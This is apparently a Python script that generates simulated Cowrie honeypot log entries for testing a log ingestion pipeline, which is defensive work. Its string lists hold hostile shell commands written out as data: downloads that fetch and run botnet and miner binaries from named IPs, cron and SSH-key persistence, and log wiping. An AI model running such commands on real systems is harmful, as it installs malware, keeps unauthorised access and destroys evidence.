#!/usr/bin/env python3
"""Simulate Cowrie honeypot log output for local testing.

Writes realistic JSON log lines to a file, mimicking real attacker sessions.
The log ingestion service tails this file and processes events in real time.

Usage:
    python simulate_cowrie.py [--output path/to/cowrie.json] [--interval 3]
"""

import argparse
import json
import random
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path

ATTACKERS = [
    {"ip": "185.220.100.240", "country": "DE"},
    {"ip": "45.95.169.130", "country": "NL"},
    {"ip": "103.203.57.4", "country": "IN"},
    {"ip": "91.92.247.42", "country": "BG"},
    {"ip": "194.87.236.14", "country": "RU"},
    {"ip": "61.177.172.140", "country": "CN"},
    {"ip": "218.92.0.56", "country": "CN"},
    {"ip": "112.85.42.88", "country": "CN"},
    {"ip": "185.196.8.70", "country": "CH"},
    {"ip": "162.142.125.10", "country": "US"},
    {"ip": "45.33.32.156", "country": "US"},
    {"ip": "89.248.167.131", "country": "NL"},
    {"ip": "5.188.210.227", "country": "RU"},
    {"ip": "43.153.96.82", "country": "SG"},
    {"ip": "177.54.150.200", "country": "BR"},
]

USERNAMES = ["root", "admin", "ubuntu", "pi", "test", "oracle", "postgres",
             "user", "guest", "ftpuser", "www", "deploy", "ec2-user", "nagios"]

PASSWORDS = ["123456", "admin", "password", "root", "toor", "1234", "test",
             "12345678", "admin123", "qwerty", "letmein", "changeme",
             "P@ssw0rd", "master", "welcome"]

RECON_COMMANDS = [
    "uname -a", "cat /etc/passwd", "whoami", "id", "cat /proc/cpuinfo",
    "hostname", "ifconfig", "ip addr", "netstat -an", "ps aux", "df -h",
    "free -m", "cat /etc/issue", "ls -la /tmp", "w",
]

MALWARE_COMMANDS = [
    "cd /tmp && wget http://185.220.100.240/bins/mirai.arm7 -O .x && chmod +x .x && ./.x",
    "curl http://45.95.169.130/sh | sh",
    "wget http://194.87.236.14/x86_64 && chmod +x x86_64 && ./x86_64",
    "tftp -g -r bot 185.172.110.224",
    "/bin/busybox wget http://91.92.247.42/Tsunami.x86",
    "curl -O http://185.196.8.70/miner.sh && bash miner.sh",
]

PERSISTENCE_COMMANDS = [
    "echo '*/5 * * * * /tmp/.update' >> /var/spool/cron/root",
    "crontab -l",
    "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
    "nohup /tmp/.update &",
]

SABOTAGE_COMMANDS = [
    "rm -rf /var/log/*",
    "history -c",
    "pkill -9 syslogd",
]

DOWNLOAD_URLS = [
    ("http://185.220.100.240/bins/mirai.arm7", "mirai.arm7"),
    ("http://45.95.169.130/bot.x86", "bot.x86"),
    ("http://194.87.236.14/xmrig", "xmrig"),
    ("http://91.92.247.42/Tsunami.x86", "Tsunami.x86"),
]


def now_iso() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")


def make_session_id() -> str:
    return uuid.uuid4().hex[:12]


def simulate_session(f, attacker: dict):
    """Write a complete attacker session as a sequence of JSON lines."""
    session_id = make_session_id()
    ip = attacker["ip"]
    src_port = random.randint(1024, 65535)
    dst_port = random.choice([22, 2222])
    protocol = "ssh"

    # 1. Session connect
    f.write(json.dumps({
        "eventid": "cowrie.session.connect",
        "src_ip": ip,
        "src_port": src_port,
        "dst_ip": "192.168.1.100",
        "dst_port": dst_port,
        "session": session_id,
        "protocol": protocol,
        "timestamp": now_iso(),
    }) + "\n")
    f.flush()
    time.sleep(random.uniform(0.3, 1.0))

    # 2. Login attempts (1-5 failures, then maybe a success)
    num_failures = random.randint(1, 5)
    for _ in range(num_failures):
        f.write(json.dumps({
            "eventid": "cowrie.login.failed",
            "username": random.choice(USERNAMES),
            "password": random.choice(PASSWORDS),
            "src_ip": ip,
            "src_port": src_port,
            "dst_port": dst_port,
            "session": session_id,
            "protocol": protocol,
            "timestamp": now_iso(),
        }) + "\n")
        f.flush()
        time.sleep(random.uniform(0.2, 0.8))

    # Successful login
    f.write(json.dumps({
        "eventid": "cowrie.login.success",
        "username": random.choice(["root", "admin", "pi"]),
        "password": random.choice(PASSWORDS),
        "src_ip": ip,
        "src_port": src_port,
        "dst_port": dst_port,
        "session": session_id,
        "protocol": protocol,
        "timestamp": now_iso(),
    }) + "\n")
    f.flush()
    time.sleep(random.uniform(0.5, 1.5))

    # 3. Commands — recon first, then maybe malware/persistence
    for cmd in random.sample(RECON_COMMANDS, random.randint(2, 5)):
        f.write(json.dumps({
            "eventid": "cowrie.command.input",
            "input": cmd,
            "src_ip": ip,
            "src_port": src_port,
            "dst_port": dst_port,
            "session": session_id,
            "protocol": protocol,
            "timestamp": now_iso(),
        }) + "\n")
        f.flush()
        time.sleep(random.uniform(0.3, 1.0))

    # Malware deployment (60% chance)
    if random.random() < 0.6:
        cmd = random.choice(MALWARE_COMMANDS)
        f.write(json.dumps({
            "eventid": "cowrie.command.input",
            "input": cmd,
            "src_ip": ip,
            "src_port": src_port,
            "dst_port": dst_port,
            "session": session_id,
            "protocol": protocol,
            "timestamp": now_iso(),
        }) + "\n")
        f.flush()
        time.sleep(random.uniform(0.5, 1.5))

        # File download event (40% chance)
        if random.random() < 0.4:
            url, filename = random.choice(DOWNLOAD_URLS)
            f.write(json.dumps({
                "eventid": "cowrie.session.file_download",
                "url": url,
                "outfile": f"/tmp/{filename}",
                "filename": filename,
                "shasum": uuid.uuid4().hex + uuid.uuid4().hex[:32],
                "src_ip": ip,
                "src_port": src_port,
                "dst_port": dst_port,
                "session": session_id,
                "protocol": protocol,
                "timestamp": now_iso(),
            }) + "\n")
            f.flush()
            time.sleep(random.uniform(0.3, 1.0))

    # Persistence (30% chance)
    if random.random() < 0.3:
        cmd = random.choice(PERSISTENCE_COMMANDS)
        f.write(json.dumps({
            "eventid": "cowrie.command.input",
            "input": cmd,
            "src_ip": ip,
            "session": session_id,
            "protocol": protocol,
            "timestamp": now_iso(),
        }) + "\n")
        f.flush()
        time.sleep(random.uniform(0.3, 0.8))

    # Sabotage (20% chance)
    if random.random() < 0.2:
        cmd = random.choice(SABOTAGE_COMMANDS)
        f.write(json.dumps({
            "eventid": "cowrie.command.input",
            "input": cmd,
            "src_ip": ip,
            "session": session_id,
            "protocol": protocol,
            "timestamp": now_iso(),
        }) + "\n")
        f.flush()

    time.sleep(random.uniform(0.5, 1.0))

    # 4. Session closed
    f.write(json.dumps({
        "eventid": "cowrie.session.closed",
        "src_ip": ip,
        "session": session_id,
        "timestamp": now_iso(),
    }) + "\n")
    f.flush()


def main():
    parser = argparse.ArgumentParser(description="Simulate Cowrie honeypot log output")
    parser.add_argument("--output", "-o", default="data/cowrie_sim.json",
                        help="Output log file path (default: data/cowrie_sim.json)")
    parser.add_argument("--interval", "-i", type=float, default=3.0,
                        help="Seconds between attack sessions (default: 3)")
    parser.add_argument("--count", "-n", type=int, default=0,
                        help="Number of sessions to simulate (0 = infinite)")
    args = parser.parse_args()

    output_path = Path(args.output)
    output_path.parent.mkdir(parents=True, exist_ok=True)

    print(f"Simulating Cowrie attacks → {output_path}")
    print(f"Interval: {args.interval}s between sessions")
    print(f"Sessions: {'infinite' if args.count == 0 else args.count}")
    print(f"Point COWRIE_LOG_PATH to this file in your .env")
    print("Press Ctrl+C to stop\n")

    session_num = 0
    try:
        with open(output_path, "a") as f:
            while True:
                attacker = random.choice(ATTACKERS)
                session_num += 1
                print(f"[{session_num}] Attack session from {attacker['ip']} ({attacker['country']})")
                simulate_session(f, attacker)
                if args.count and session_num >= args.count:
                    break
                time.sleep(args.interval)
    except KeyboardInterrupt:
        print(f"\nStopped after {session_num} sessions.")


if __name__ == "__main__":
    main()
